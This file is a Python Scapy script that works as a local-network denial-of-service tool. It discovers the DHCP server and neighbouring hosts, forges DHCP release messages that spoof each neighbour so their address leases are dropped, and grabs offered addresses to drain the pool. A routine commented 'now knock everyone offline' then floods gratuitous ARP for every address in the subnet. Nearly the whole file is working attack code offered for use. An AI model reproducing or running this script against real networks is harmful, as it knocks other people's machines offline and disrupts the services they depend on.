#! /usr/bin/env python
from scapy.all import *
import string,binascii,signal,sys,threading,socket,struct

conf.checkIPaddr = False
verbose = False


def signal_handler(signal, frame):
        print 'Exit'
	t1.kill_received = True
	t2.kill_received = True
        sys.exit(0)



######################################
def randomMAC():
	mac = [ 0x00, 0x0c, 0x29,
		random.randint(0x00, 0x7f),
		random.randint(0x00, 0xff),
		random.randint(0x00, 0xff) ]
	return ':'.join(map(lambda x: "%02x" % x, mac))

def toNum(ip):
    "convert decimal dotted quad string to long integer"
    return struct.unpack('L',socket.inet_aton(ip))[0]

def get_ip(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def get_if_net(iff):
    for net, msk, gw, iface, addr in read_routes():
       if (iff == iface and net != 0L):
          return ltoa(net)
    warning("No net address found for iface %s\n" % iff);

def get_if_ip(iff):
    for net, msk, gw, iface, addr in read_routes():
       if (iff == iface and net != 0L):
          return addr
    warning("No net address found for iface %s\n" % iff);

def calcCIDR(mask):
    mask = mask.split('.')
    bits = []
    for c in mask:
       bits.append(bin(int(c)))
    bits = ''.join(bits)
    cidr = 0
    for c in bits:
        if c == '1': cidr += 1
    return str(cidr)

def unpackMAC(binmac):
   mac=binascii.hexlify(binmac)[0:12]
   blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
   return ':'.join(blocks)




##########################################################
#
#
#
def neighbors():
     global dhcpsip,subnet,nodes
     nodes={}
     m=randomMAC()
     net=dhcpsip+"/"+calcCIDR(subnet)
     ans,unans = srp(Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net,psrc=dhcpsip), timeout=8,
                    filter="arp and arp[7] = 2")
     for request,reply in ans:
       nodes[reply.hwsrc]=reply.psrc
       print "%15s - %s " % (reply.psrc, reply.hwsrc)

#
#
#
def release():
   global dhcpsmac,dhcpsip,nodes
   print "Sending Release"
   myxid=random.randint(1, 900000000)
   #
   #iterate over all ndoes and release their IP from DHCP server
   for cmac,cip in nodes.iteritems():
     dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
     sendp(dhcp_release,verbose=0)
     if verbose: print "%r"%dhcp_release

#
#
#now knock everyone offline
def garp():
  global dhcpsip,subnet
  pool=Net(dhcpsip+"/"+calcCIDR(subnet))
  for ip in pool:
    m=randomMAC()
    arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
    sendp(arpp,verbose=0)
    if verbose: print "%r"%arpp

#
# loop and send Discovers
#
class send_dhcp(threading.Thread):
   def __init__ (self):
        threading.Thread.__init__(self)
	self.kill_received = False

   def run(self):
     global timer,dhcpdos
     while not self.kill_received and not dhcpdos:
       m=randomMAC()
       myxid=random.randint(1, 900000000)
       hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
       dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
       print "\n\n\nSending DHCP DISCOVER"
       sendp(dhcp_discover)
       time.sleep(timer)

#
#
# sniff DHCP Offers and ACK
#
class sniff_dhcp(threading.Thread):
   def __init__ (self):
     threading.Thread.__init__(self)
     self.filter = "icmp or (udp and src port 67 and dst port 68)"
     self.kill_received = False
     self.dhcpcount=0

   def run(self):
     global dhcpdos
     while not self.kill_received and not dhcpdos:
       sniff(filter=self.filter,prn=self.detect_dhcp, store=0,timeout=3)
       print "timeout waiting on dhcp packet count %d"%self.dhcpcount
       self.dhcpcount+=1
       if self.dhcpcount==2: dhcpdos=True
          
   def detect_dhcp(self,pkt):
      global dhcpsmac,dhcpsip,subnet
      if DHCP in pkt:
        if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
          self.dhcpcount=0
          dhcpsip = pkt[IP].src
          dhcpsmac = pkt[Ether].src
          for opt in pkt[DHCP].options:
           if opt[0] == 'subnet_mask':
	    subnet=opt[1]
            break

          myip=pkt[BOOTP].yiaddr
          sip=pkt[BOOTP].siaddr
          localxid=pkt[BOOTP].xid
          localm=unpackMAC(pkt[BOOTP].chaddr)
          myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
        
          print("DHCPOFFER detected from " + pkt[Ether].src,sip + " Handing out IP: "+myip)
          dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
          sendp(dhcp_req,verbose=0)
          print "sent DHCP Request for "+myip
      elif ICMP in pkt:
         if pkt[ICMP].type==8:
           myip=pkt[IP].dst
           mydst=pkt[IP].src
           print "ICMP request from "+mydst+" for "+myip 
           icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
	   if verbose: print "%r"%icmp_req 
           #sendp(icmp_req,verbose=0)
           #print "ICMP response from "+myip+" to "+mydst 


#
#
# MAIN()
#
def main(args):
  signal.signal(signal.SIGINT, signal_handler)
  global t1,t2,t3,dhcpdos,dhcpsip,dhcpmac,subnet,nodes,timer
  dhcpsip=None
  dhcpsmac=None
  subnet=None
  nodes={}
  dhcpdos=False 
  timer=1
  
  t1=sniff_dhcp()
  t1.start()

  #t2=send_dhcp()
  #t2.start()

  while dhcpsip==None:
   time.sleep(1)
   print "waiting for first DHCP Server response"

  neighbors()
  release()

  while not dhcpdos:
   time.sleep(5)
   print "waiting for DOS"
    
  garp()


if __name__ == '__main__':
  main(sys.argv)



